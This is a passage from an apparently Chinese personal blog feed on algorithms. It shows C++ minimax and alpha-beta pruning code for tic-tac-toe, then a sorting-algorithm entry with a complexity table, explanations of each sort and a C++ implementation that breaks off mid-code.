class="number">2</span>]==<span class="number">2</span>&amp;&amp;a[<span class="number">1</span>][<span class="number">1</span>]==<span class="number">2</span>&amp;&amp;a[<span class="number">2</span>][<span class="number">0</span>]==<span class="number">2</span>) <span class="keyword">return</span> -x<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(x==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//平局 </span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">-2000</span>;<span class="comment">//棋局未结束 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> dep)</span></span>&#123;</span><br><span class="line">    <span class="comment">//dep=0代表先手，1代表后手</span></span><br><span class="line">    <span class="keyword">int</span> res=check();</span><br><span class="line">    <span class="keyword">if</span>(res!=<span class="number">-2000</span>)<span class="comment">//棋局结束 </span></span><br><span class="line"><span class="keyword">return</span> res;<span class="comment">//叶子节点返回</span></span><br><span class="line">    <span class="keyword">int</span> Res = dep==<span class="number">0</span> ? <span class="number">-1000</span>:<span class="number">1000</span>;</span><br><span class="line">    rep(i,<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">        rep(j,<span class="number">0</span>,<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!a[i][j])&#123;</span><br><span class="line">                a[i][j] = dep==<span class="number">0</span> ? <span class="number">1</span>:<span class="number">2</span>;<span class="comment">//打标签 </span></span><br><span class="line">                <span class="keyword">if</span>( dep==<span class="number">0</span> )<span class="comment">//先手找最大</span></span><br><span class="line">Res = max(Res, dfs(dep^<span class="number">1</span>));<span class="comment">//按位异或实现01轮流下棋</span></span><br><span class="line">                <span class="keyword">else</span><span class="comment">//后手找最小</span></span><br><span class="line">Res = min(Res, dfs(dep^<span class="number">1</span>));</span><br><span class="line">                a[i][j] = <span class="number">0</span>;<span class="comment">//去标签 </span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> Res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">int</span> T;<span class="comment">//测试组数 </span></span><br><span class="line"><span class="built_in">cin</span>&gt;&gt; T;</span><br><span class="line">    <span class="keyword">while</span>(T--)&#123;</span><br><span class="line">        rep(i,<span class="number">0</span>,<span class="number">2</span>)<span class="comment">//输入当前棋盘 </span></span><br><span class="line">            rep(j,<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">                <span class="built_in">cin</span>&gt;&gt; a[i][j];</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt; dfs(<span class="number">0</span>)&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用用alpha-beta剪枝：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(x,a,b) for(int x=(a);x&lt;=(b);x++)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">4</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn][maxn];<span class="comment">//棋盘 </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//计算评估分数，-2000代表还能继续进行棋局</span></span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line">    rep(i,<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">        rep(j,<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">            x+=(a[i][j]==<span class="number">0</span>);</span><br><span class="line">    rep(i,<span class="number">0</span>,<span class="number">2</span>)&#123;<span class="comment">//A或B获胜 </span></span><br><span class="line">        <span class="keyword">if</span>(a[i][<span class="number">0</span>]==<span class="number">1</span>&amp;&amp;a[i][<span class="number">1</span>]==<span class="number">1</span>&amp;&amp;a[i][<span class="number">2</span>]==<span class="number">1</span>) <span class="keyword">return</span> x+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[i][<span class="number">0</span>]==<span class="number">2</span>&amp;&amp;a[i][<span class="number">1</span>]==<span class="number">2</span>&amp;&amp;a[i][<span class="number">2</span>]==<span class="number">2</span>) <span class="keyword">return</span> -x<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[<span class="number">0</span>][i]==<span class="number">1</span>&amp;&amp;a[<span class="number">1</span>][i]==<span class="number">1</span>&amp;&amp;a[<span class="number">2</span>][i]==<span class="number">1</span>) <span class="keyword">return</span> x+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[<span class="number">0</span>][i]==<span class="number">2</span>&amp;&amp;a[<span class="number">1</span>][i]==<span class="number">2</span>&amp;&amp;a[<span class="number">2</span>][i]==<span class="number">2</span>) <span class="keyword">return</span> -x<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//A或B获胜 </span></span><br><span class="line">    <span class="keyword">if</span>(a[<span class="number">0</span>][<span class="number">0</span>]==<span class="number">1</span>&amp;&amp;a[<span class="number">1</span>][<span class="number">1</span>]==<span class="number">1</span>&amp;&amp;a[<span class="number">2</span>][<span class="number">2</span>]==<span class="number">1</span>) <span class="keyword">return</span> x+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(a[<span class="number">0</span>][<span class="number">2</span>]==<span class="number">1</span>&amp;&amp;a[<span class="number">1</span>][<span class="number">1</span>]==<span class="number">1</span>&amp;&amp;a[<span class="number">2</span>][<span class="number">0</span>]==<span class="number">1</span>) <span class="keyword">return</span> x+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(a[<span class="number">0</span>][<span class="number">0</span>]==<span class="number">2</span>&amp;&amp;a[<span class="number">1</span>][<span class="number">1</span>]==<span class="number">2</span>&amp;&amp;a[<span class="number">2</span>][<span class="number">2</span>]==<span class="number">2</span>) <span class="keyword">return</span> -x<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(a[<span class="number">0</span>][<span class="number">2</span>]==<span class="number">2</span>&amp;&amp;a[<span class="number">1</span>][<span class="number">1</span>]==<span class="number">2</span>&amp;&amp;a[<span class="number">2</span>][<span class="number">0</span>]==<span class="number">2</span>) <span class="keyword">return</span> -x<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(x==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//平局 </span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">-2000</span>;<span class="comment">//棋局未结束 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> dep, <span class="keyword">int</span> lval)</span></span>&#123;</span><br><span class="line"><span class="comment">//dep=0代表先手，1代表后手</span></span><br><span class="line">    <span class="comment">//lval表示如果父亲是先手就是父亲的alpha，否则是父亲的beta</span></span><br><span class="line">    <span class="keyword">int</span> res=check();</span><br><span class="line">    <span class="keyword">if</span>(res!=<span class="number">-2000</span>)<span class="comment">//棋局结束  </span></span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">    <span class="keyword">if</span>(dep==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">int</span> alpha=<span class="number">-1e9</span>;<span class="comment">//alpha表示先手能找到的最大值</span></span><br><span class="line">        rep(i,<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">            rep(j,<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">                <span class="keyword">if</span>(!a[i][j])&#123;</span><br><span class="line">                    a[i][j]=<span class="number">1</span>;</span><br><span class="line">                    alpha=max(alpha,dfs(dep^<span class="number">1</span>,alpha));</span><br><span class="line">                    a[i][j]=<span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">if</span>(alpha&gt;lval) <span class="keyword">return</span> alpha;</span><br><span class="line">                    <span class="comment">//如果先手能找到的最大值比后手父亲能找到的最小值还大，后手父亲就肯定不选当前的子树，直接返回进行剪枝</span></span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">return</span> alpha;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> beta=<span class="number">1e9</span>;<span class="comment">//beta表示后手能找到的最小值</span></span><br><span class="line">        rep(i,<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">            rep(j,<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">                <span class="keyword">if</span>(!a[i][j])&#123;</span><br><span class="line">                    a[i][j]=<span class="number">2</span>;</span><br><span class="line">                    beta=min(beta,dfs(dep^<span class="number">1</span>,beta));</span><br><span class="line">                    a[i][j]=<span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">if</span>(beta&lt;lval) <span class="keyword">return</span> beta;</span><br><span class="line">                    <span class="comment">//反之同理</span></span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">return</span> beta;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">int</span> T;<span class="comment">//测试组数 </span></span><br><span class="line"><span class="built_in">cin</span>&gt;&gt; T;</span><br><span class="line">    <span class="keyword">while</span>(T--)&#123;</span><br><span class="line">        rep(i,<span class="number">0</span>,<span class="number">2</span>)<span class="comment">//输入当前棋盘 </span></span><br><span class="line">            rep(j,<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">                <span class="built_in">cin</span>&gt;&gt; a[i][j];</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt; dfs(<span class="number">0</span>, <span class="number">1e9</span>)&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><p>1. </p>]]></content>
      
      
      <categories>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DFS </tag>
            
            <tag> BFS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排序算法</title>
      <link href="/2021/04/10/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
      <url>/2021/04/10/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="table-container"><table><thead><tr><th style="text-align:center">排序算法</th><th style="text-align:center">最好时间复杂度</th><th style="text-align:center">平均时间复杂度</th><th style="text-align:center">最坏时间复杂度</th><th style="text-align:center">空间复杂度</th><th style="text-align:center">稳定性</th></tr></thead><tbody><tr><td style="text-align:center">直接插入排序</td><td style="text-align:center">有序：$O(n)$</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">逆序：$O(n^2)$</td><td style="text-align:center">$O(1)$</td><td style="text-align:center">稳定</td></tr><tr><td style="text-align:center">希尔排序</td><td style="text-align:center">复杂度未得到证明</td><td style="text-align:center">$O(n^{1.3-2})$</td><td style="text-align:center">d=1：$O(n^2)$</td><td style="text-align:center">$O(1)$</td><td style="text-align:center">不稳定</td></tr><tr><td style="text-align:center">冒泡排序</td><td style="text-align:center">有序：$O(n)$</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">逆序：$O(n^2)$</td><td style="text-align:center">$O(1)$</td><td style="text-align:center">稳定</td></tr><tr><td style="text-align:center">快速排序</td><td style="text-align:center">划分均匀：$O(nlog_2n)$</td><td style="text-align:center">$O(nlog_2n)$</td><td style="text-align:center">有序：$O(n^2)$</td><td style="text-align:center">$O(log_2n\sim n)$</td><td style="text-align:center">不稳定</td></tr><tr><td style="text-align:center">简单选择排序</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(n^2)$</td><td style="text-align:center">$O(1)$</td><td style="text-align:center">不稳定</td></tr><tr><td style="text-align:center">堆排序</td><td style="text-align:center">$O(nlog_2n)$</td><td style="text-align:center">$O(nlog_2n)$</td><td style="text-align:center">$O(nlog_2n)$</td><td style="text-align:center">$O(1)$</td><td style="text-align:center">不稳定</td></tr><tr><td style="text-align:center">归并排序</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center">$O(nlog_2n)$</td><td style="text-align:center">$O(n)$</td><td style="text-align:center">稳定</td></tr><tr><td style="text-align:center">基数排序</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center">$O(d(r+n))$</td><td style="text-align:center">$O(r)$</td><td style="text-align:center">稳定</td></tr></tbody></table></div><h1 id="1-直接插入排序（Insertion-Sort）"><a href="#1-直接插入排序（Insertion-Sort）" class="headerlink" title="1 直接插入排序（Insertion Sort）"></a>1 直接插入排序（Insertion Sort）</h1><p>插入排序的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。插入排序在实现上，通常采用in-place排序（即只需用到O(1)的额外空间的排序），因而在从后向前扫描过程中，需要反复把已排序元素逐步向后挪位，为最新元素提供插入空间。</p><p>优化：先用折半查找找到应该插入的位置，再移动元素。</p><h1 id="2-希尔排序（Shell-Sort）"><a href="#2-希尔排序（Shell-Sort）" class="headerlink" title="2 希尔排序（Shell Sort）"></a>2 希尔排序（Shell Sort）</h1><p>先将待排序表分割成若干形如$L[i,i+d,i+2d,…,i+kd]$的特殊子表，对各个子表分别进行直接插入排序。缩小增量d，重复上述过程，直到d=1为止。（希尔本人建议：d初始值为n，然后每次将增量缩小一半）</p><p>适用性：仅适用于顺序表，不适用于链表</p><h1 id="3-冒泡排序（Bubble-Sort）"><a href="#3-冒泡排序（Bubble-Sort）" class="headerlink" title="3 冒泡排序（Bubble Sort）"></a>3 冒泡排序（Bubble Sort）</h1><p><strong>冒泡排序</strong>是一种交换排序，它的思路就是在待排序的数据中，两两比较相邻元素的大小，看是否满足大小顺序的要求，如果满足则不动，如果不满足则让它们互换。然后继续与下一个相邻元素的比较，一直到一次遍历完成。一次遍历的过程就被成为一次冒泡，一次冒泡的结束至少会让一个元素移动到了正确的位置。所以要想让所有元素都排序好，一次冒泡还不行，我们得重复N次去冒泡，这样最终就完成了N个数据的排序过程。</p><p>对一个长度为 $n$ 的排列 $p[i]$ 进行一轮冒泡排序的伪代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i = <span class="number">1</span> to n<span class="number">-1</span>:</span><br><span class="line"><span class="keyword">if</span> p[i] &gt; p[i + <span class="number">1</span>]:</span><br><span class="line">swap(p[i], p[i + <span class="number">1</span>])</span><br></pre></td></tr></table></figure><h1 id="4-快速排序（Quck-Sort）"><a href="#4-快速排序（Quck-Sort）" class="headerlink" title="4 快速排序（Quck Sort）"></a>4 快速排序（Quck Sort）</h1><p>快速排序是一种交换排序，它的思路：在待排序表$L[1…n]$中任取一个元素 pivot 作为枢轴（或基准，通常取首元素），通过一趟排序表划分为独立的两部分$L[1…k-1]$和$L[k+1…n]$，使得$L[1…k-1]$中的所有元素小于 pivot，$L[k+1…n]$中的所有元素大于等于 pivot，则 pivot放在了其最终位置$L[k]$上，这个过程称为一次“划分”。然后分别递归地对两个子表重复上述过程，直至每部分内只有一个元素或空为止，即所有元素放在了其最终位置上。</p><p>若每一次选中的“枢轴”将待排序序列划分为均匀的两个部分，则递归深度最小，算法效率最高。</p><p>优化：</p><ol><li>选头、中、尾、三个位置的元素，取中间值作为枢轴元素；</li><li>随机选一个元素作为枢轴元素。</li></ol><h1 id="5-简单选择排序（Selection-Sort）"><a href="#5-简单选择排序（Selection-Sort）" class="headerlink" title="5 简单选择排序（Selection Sort）"></a>5 简单选择排序（Selection Sort）</h1><p>选择排序：每一趟在待排序元素中选取关键字最小（或最大）的元素加入有序子序列。</p><p>适用性：既可以用于顺序表，也可用于链表</p><h1 id="6-堆排序（Heap-Sort）"><a href="#6-堆排序（Heap-Sort）" class="headerlink" title="6 堆排序（Heap Sort）"></a>6 堆排序（Heap Sort）</h1><p>堆排序是选择排序的一种，思路：每一趟将堆顶元素加入到有序子序列（与待排序序列中的最后一个元素交换），并将待排序元素序列再次调整为大根堆（小元素不断下坠）</p><p><strong>什么是堆？</strong></p><p>若$n$个关键字序列$L[1..n]$满足下面某一条性质，则称为堆（Heap）：</p><ol><li>若满足：$L(i)≥L(2i)$且$L(i)≥L(2i+1)$，$(1 \leq i \leq n / 2)$——大根堆（大顶堆）</li><li>若满足：$L(i)≤L(2i)$且$L(i)≤L(2i+1)$，$(1 \leq i \leq n / 2)$——小根堆（小顶堆）</li></ol><p><strong>建立大根堆</strong>：</p><ol><li>把所有非终端结点都检查一遍，是否满足大根堆的要求，如果不满足则进行调整</li><li>检查当前结点是否满足<code>根节点&gt;=左、右</code>，若不满足，将当前结点与更大的一个孩子互换</li><li>若元素互换破坏了下一级的堆，则采用相同的方法继续往下调整（小元素不断“下坠”）</li></ol><p>建堆$O(n)$，排序$O(nlogn)$</p><p><strong>在堆中插入新元素</strong>：</p><ol><li>对于大根堆，新元素放到表尾，与父结点相比，若新元素比父节点更大，则将二者互换。新元素就这样一路上升，直到无法继续上升。</li></ol><p><strong>在堆中删除元素</strong>：</p><ol><li>被删除元素用堆底元素代替，然后让该元素不断下坠，直到无法下坠为止。</li></ol><h1 id="7-归并排序（Merge-Sort）"><a href="#7-归并排序（Merge-Sort）" class="headerlink" title="7 归并排序（Merge Sort）"></a>7 归并排序（Merge Sort）</h1><p>把两个或多个已经有序的序列合并成一个。</p><p>核心操作：把数组内的两个有序序列归并为一个。</p><h1 id="8-基数排序（Radix-Sort）"><a href="#8-基数排序（Radix-Sort）" class="headerlink" title="8 基数排序（Radix Sort）"></a>8 基数排序（Radix Sort）</h1><p>假设长度为$n$的线性表中每个结点$a$的关键字由$d$元组$\left(k<em>{j}^{d-1}, k</em>{j}^{d-2}, k<em>{j}^{d-3}, \ldots, k</em>{j}^{1}, k<em>{j}^{0}\right)$组成，其中，$0 \leq k</em>{j}^{i} \leq r-1 \quad(0 \leq j&lt;n, 0 \leq i \leq d-1)$，$r$称为基数。</p><p><strong>基数排序得到递减序列的过程如下</strong>：</p><ol><li>初始化：设置$r$个空队列，$Q<em>{r-1}，Q</em>{r-2}…Q_0$</li><li>按照各个关键字位权重递增的次序（个、十、百），对$d$个关键字位分别做“分配”和“收集”</li><li>分配：顺序扫描各个元素，若当前处理的关键字位=x，则将元素插入$Q_x$队尾</li><li>收集：把$Q<em>{r-1}，Q</em>{r-2}…Q_0$各个队列中的结点依次出队并链接</li></ol><p><strong>注意</strong>：</p><ol><li>基数排序不是基于比较的排序算法；基数排序通常基于链式存储实现。</li><li>需要$r$个辅助队列，空间复杂度为$O(r)$，其中$r$为基数；</li><li>一趟分配$O(n)$，一趟收集$O(r)$，总共$d$趟分配、收集，总的时间复杂度=$O(d(n+r))$</li></ol><p><strong>基数排序擅长解决的问题</strong>：</p><ol><li>数据元素的关键字可以方便地拆分成$d$组，且$d$较小；</li><li>每组的关键字的取值范围不大，即$r$较小</li><li>数据元素个数$n$较大</li></ol><h1 id="9-外部排序"><a href="#9-外部排序" class="headerlink" title="9 外部排序"></a>9 外部排序</h1><p><strong>外部排序原理</strong>：</p><p>外部排序：数据元素太多，无法一次全部读入内存进行排序。</p><p>使用归并排序的方法，最少只需在内存中分配3块大小的缓冲区即可对任意一个大文件进行排序。</p><p><strong>步骤</strong>：</p><ol><li>构造初始归并段：归并排序要求各个子序列有序，每次读入两个块的内容，进行内部排序后写回磁盘；</li><li>第一趟归并：将两个归并段归并为一个，缓冲区1/2空了就要立即用归并段1/2的下一块补上</li><li>第二趟归并：与第一趟类似…</li></ol><p><strong>时间开销分析</strong>：</p><ol><li>外部排序时间开销=读写外存时间+内部排序所需时间+内部归并所需时间</li></ol><p><strong>优化</strong>：</p><ol><li>多路归并：采用多路归并可以减少归并趟数，从而减少磁盘I/O(读写)次数</li><li>减少初始归并段数量：生成初始归并段的“内存工作区”越大，初始归并段越长，则可减少初始归并段数量r</li></ol><h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e5</span> + <span class="number">5</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> arr[maxn] = &#123;<span class="number">0</span>, <span class="number">53</span>, <span class="number">17</span>, <span class="number">78</span>, <span class="number">9</span>, <span class="number">45</span>, <span class="number">65</span>, <span class="number">87</span>, <span class="number">32</span>&#125;;<span class="comment">//下标从1开始 </span></span><br><span class="line"><span class="keyword">int</span> n;<span class="comment">//数组长度 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//直接插入排序</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert_sort</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, tmp;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">tmp = arr[i];</span><br><span class="line"><span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= <span class="number">1</span>; j--) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[j] &gt; tmp) &#123;</span><br><span class="line">arr[j + <span class="number">1</span>] = arr[j];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">arr[j + <span class="number">1</span>] = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//希尔排序</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell_sort</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, tmp, d;</span><br><span class="line"><span class="keyword">for</span> (d = n / <span class="number">2</span>; d &gt;= <span class="number">1</span>; d /= <span class="number">2</span>) &#123;<span class="comment">//增量 </span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span> + d; i &lt;= n; i++) &#123;</span><br><span class="line">tmp = arr[i];</span><br><span class="line"><span class="keyword">for</span> (j = i - d; j &gt;= d; j -= d) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[j] &gt; tmp) &#123;</span><br><span class="line">arr[j + d] = arr[j];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">arr[j + d] = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//冒泡排序 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bubble_sort</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n - <span class="number">1</span>; i++) &#123;</span><br><span class="line"><span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n - i; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">swap(arr[j], arr[j + <span 